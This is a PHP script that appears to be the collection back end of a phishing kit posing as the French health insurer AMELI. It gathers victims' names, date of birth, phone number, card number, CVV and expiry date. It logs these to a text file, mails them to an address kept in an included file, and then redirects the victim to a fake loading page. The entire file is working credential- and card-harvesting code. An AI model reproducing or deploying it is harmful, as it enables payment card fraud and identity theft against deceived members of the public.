<?php
include 'antibots.php';
include 'email.php';
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);
$message .= "[AMELI]\n";
$message .= "Nom      : ".$_POST['001']."\n";
$message .= "Prenom   : ".$_POST['002']."\n";
$message .= "JMA      : ".$_POST['003']."\n";
$message .= "Tele     : ".$_POST['004']."\n";
$message .= "*******************************************\n";
$message .= "Cc       : ".$_POST['005']."\n";
$message .= "Cv       : ".$_POST['006']."\n";
$message .= "Exp      : ".$_POST['007']."/".$_POST['008']."\n";
$message .= "[DON]\n";
$file = fopen("../../info.txt","a");
fwrite($file, "\n".$message);
fclose($file);
$subject = "DON[CVV] $ip";
$headers = "From: <localhost>";
mail($send,$subject,$message,$headers);

echo '<script language="Javascript">
<!--
document.location.replace("./loding1.html");
// -->
</script>';
?>